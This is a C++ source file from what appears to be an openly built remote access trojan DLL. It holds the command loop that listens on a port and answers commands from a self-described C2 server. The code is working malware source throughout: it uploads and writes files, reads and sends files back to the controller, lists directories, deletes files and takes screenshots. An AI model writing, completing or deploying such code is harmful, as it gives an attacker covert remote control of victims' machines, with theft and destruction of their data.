// Patrick Sacchet (@pjsacchet)
// Verison 1.0
// RAT-Dll-Connect.cpp : This file contains functionality for handling our connection back to our C2 server

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-GetFile.h"
#include "RAT-Dll-PutFile.h"
#include "RAT-Dll-DirList.h"
#include "RAT-Dll-DeleteFile.h"
#include "RAT-Dll-Screenshot.h"


/** This function will serve as our main 'handler' for C2 requests
*       It will continously serve our server connection until the connection is closed, reading request types and responding to them as needed
params: 
* N/A
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT startListen()
{
    WORD wsaVersion;
    WSADATA wsaData;
    SOCKET clientSock, serverSock;
    SOCKADDR_IN client;
    INT status = SUCCESS;
    INT sendStatus = 0;
    INT recvBufLen = DEFAULT_BUF_LEN;
    INT bOptLen = sizeof(BOOL);
    BOOL bOptVal = FALSE;
    CHAR recvBuf[DEFAULT_BUF_LEN];
    CHAR msgBuf[DEFAULT_BUF_LEN];

    wsaVersion = MAKEWORD(2, 2);

    if (WSAStartup(wsaVersion, &wsaData))
    {
        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed WSAStartup! Error code %u\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    OutputDebugStringA("RAT-Dll-Connect::startListen - WSAStartup was successful! \n");

    // Information for target
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT_NUM);

    // Accept any IP address
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    clientSock = INVALID_SOCKET;

    serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to create socket! \n");
        status = WSAGetLastError();
        goto cleanup;
    }

    status = bind(serverSock, (LPSOCKADDR)&client, sizeof(client));
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to bind to socket! \n");
        status = WSAGetLastError();
        goto cleanup;
     }

    // Set keepalive for our server socket
    status == setsockopt(serverSock, SOL_SOCKET, SO_KEEPALIVE, (char*)bOptVal, bOptLen);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to set keepalive options! \n");
        status = WSAGetLastError();
        goto cleanup;
    }
        
    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Listening on port %u\n", PORT_NUM);
    OutputDebugStringA(msgBuf);

    status = listen(serverSock, SOMAXCONN);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Socket error ! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    clientSock = accept(serverSock, NULL, NULL);
    if (clientSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Invalid socket from client! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    // Close server socket since we no longer need it 
    closesocket(serverSock);

    // Receive from client until the peer shuts down the connection
        // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
        // TODO: Separate each conditional into its own function... probably in its respective cpp file. Have master handler in another function in this cpp file 
    do
    {
        OutputDebugStringA("RAT-Dll::startListen - Connection from C2 recieved! Waiting for command... \n");
        status = recv(clientSock, recvBuf, recvBufLen, 0);
        if (status > 0)
        {

            // C2 told us to put a file so lets get the file path first 
            if (strcmp((const char*)&recvBuf, PUT) == 0)
            {
                // Get the file path
                status = recv(clientSock, recvBuf, recvBufLen, 0);
                if (status == SOCKET_ERROR)
                {               
                    // TODO: have a function call to send back failure? Request a resend?
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file path) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    continue; // keep trying to do things until we disconnect or receive a cleanup message
                }

                // Assign file path to separate buffer 
                CHAR filePathBuffer[DEFAULT_BUF_LEN];
                strcpy(filePathBuffer, recvBuf);

                // We got the file path 
                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file on path %s...\n", filePathBuffer);
                OutputDebugStringA(msgBuf);

                // Get the actual file bytes
                status = recv(clientSock, recvBuf, recvBufLen, 0);
                if (status == SOCKET_ERROR)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file bytes) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    continue;
                }

                CONST UINT64 fileBytesSize = strlen(recvBuf);
                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file with %i bytes...\n", fileBytesSize);
                OutputDebugStringA(msgBuf);

                // Just a char buffer containing our bytes 
                char* fileBytes = (char*)malloc(sizeof(char) * fileBytesSize);
                if (fileBytes == NULL)
                {
                    OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
                    status = FAILURE;
                    goto cleanup;
                }

                strcpy(fileBytes, recvBuf);
                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file with bytes %s...\n", fileBytes);
                OutputDebugStringA(msgBuf);

                // Get our overwrite value 
                status = recv(clientSock, recvBuf, recvBufLen, 0);
                if (status == SOCKET_ERROR)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (overwrite) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    continue;
                }

                BOOL overwrite = *recvBuf;
                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Put file overwrite value %i ...\n", overwrite);
                OutputDebugStringA(msgBuf);

                status = performPutFile(filePathBuffer, fileBytes, overwrite);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performPutFile %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }

                // Send back our success code 
                status = send(clientSock, "SUCCESS", 7, 0);
                if (status == SOCKET_ERROR)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    status = WSAGetLastError();
                    goto cleanup;
                }

                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully put file!\n");

                free(fileBytes);
            }

            // C2 told us to get a file so lets get the file path first 
            else if (strcmp((const char*)&recvBuf, GET) == 0)
             {
                // Receive our file path 
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
                 if (status != SOCKET_ERROR) // TODO: change this to match conditional like above; check for failure and fail out otherwise continue 
                 {
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing get file on %s...\n", recvBuf);
                     OutputDebugStringA(msgBuf);

                     char** fileBytes = (char**)malloc(sizeof(char*));
                     if (fileBytes == NULL)
                     {
                         OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
                         status = FAILURE;
                         goto cleanup;
                     }

                     DWORD bufferSize = 0;

                    status = performGetFile((const char*)&recvBuf, fileBytes, &bufferSize);
                     if (status != SUCCESS)
                     {
                         // Send back failure here as well 
                         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performGetFile %d\n", status);
                         OutputDebugStringA(msgBuf);
                         goto cleanup;
                     }
                
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %d bytes from file\n", bufferSize);
                     OutputDebugStringA(msgBuf);

                     OutputDebugStringA("RAT-Dll-Connect::startListen - Sending status SUCCESS back to C2...\n");

                     // Change this to code constants later... bit dumb to have string here but whatever 
                     status = send(clientSock, "SUCCESS", 7, 0);
                     if (status == SOCKET_ERROR)
                     {
                         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
                         OutputDebugStringA(msgBuf);
                         status = WSAGetLastError();
                         goto cleanup;
                     }

                     OutputDebugStringA("RAT-Dll-Connect::startListen - Sending buffer back to C2...\n");

                     status = send(clientSock, *fileBytes, bufferSize, 0);
                     if (status == SOCKET_ERROR)
                     {
                         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
                         OutputDebugStringA(msgBuf);
                         status = WSAGetLastError();
                         goto cleanup;
                     }

                     // Free the buffer we point to then free the memory we allocated for the pointer
                     free(*fileBytes);
                     free(fileBytes);
                 }
                 // Failed to get our file path...
                 else
                 {
                     OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (file path)\n");
                     status = FAILURE;
                     goto cleanup;
                 }
             }

            // C2 says to do a dir list for specific directory 
            else if (strcmp((const char*)&recvBuf, DIR) == 0)
             {
                // Receive our directory path 
                status = recv(clientSock, recvBuf, recvBufLen, 0);
                if (status == SOCKET_ERROR)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (dir path) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    continue; // keep trying to do things until we disconnect or receive a cleanup message
                }

                // Got our directory path 
                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing dir list on %s...\n", recvBuf);
                OutputDebugStringA(msgBuf);

                CHAR** dirFiles = NULL;
                UINT32 numDirFiles = 0;

                status = performDirList(recvBuf, &dirFiles, &numDirFiles);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from performDirList %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }

                // Send back each of our files
                status = sendDirFiles(clientSock, dirFiles, numDirFiles);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from sendDirFiles %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }

                // Send back success status code
                status = send(clientSock, "SUCCESS", 7, 0);
                if (status == SOCKET_ERROR)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    status = WSAGetLastError();
                    goto cleanup;
                }

                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed dir list!\n");
             }

            // C2 says to delete a file from a specific path 
            else if (strcmp((const char*)&recvBuf, DEL) == 0)
            {
                // Get the file path
                status = recv(clientSock, recvBuf, recvBufLen, 0);
                if (status == SOCKET_ERROR)
                {
                    // TODO: have a function call to send back failure? Request a resend?
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file path) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    continue; // keep trying to do things until we disconnect or receive a cleanup message
                }

                status = performDeleteFile(recvBuf);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performDeleteFile %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }

                // Send back success status code
                status = send(clientSock, "SUCCESS", 7, 0);
                if (status == SOCKET_ERROR)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
                    OutputDebugStringA(msgBuf);
                    status = WSAGetLastError();
                    goto cleanup;
                }

                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed delete file!\n");
            }

            // C2 says to take a screenshot 
            else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
            {
                status = performScreenshot(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performScreenshot %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }

                // TODO: change this so we pass a file handle maybe? then do sendback here along with success code 

            }
        }

        else if (status == 0)
        {
            OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (file path); attempting to recv again...\n");
        }

        else
        {
            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from recv (file path) %d\n", WSAGetLastError());
            OutputDebugStringA(msgBuf);
            closesocket(clientSock);
            WSACleanup();
            return FALSE;
        }

    } while (status > 0);

    OutputDebugStringA("RAT-Dll::startListen - status < 0 so we're exiting...\n");

    // Shutdown connection since we're done
    status = shutdown(clientSock, SD_SEND);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from shutdown %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        closesocket(clientSock);
        WSACleanup();
        return FALSE;
    }

    closesocket(clientSock);
    WSACleanup();


cleanup:
    return status;
}


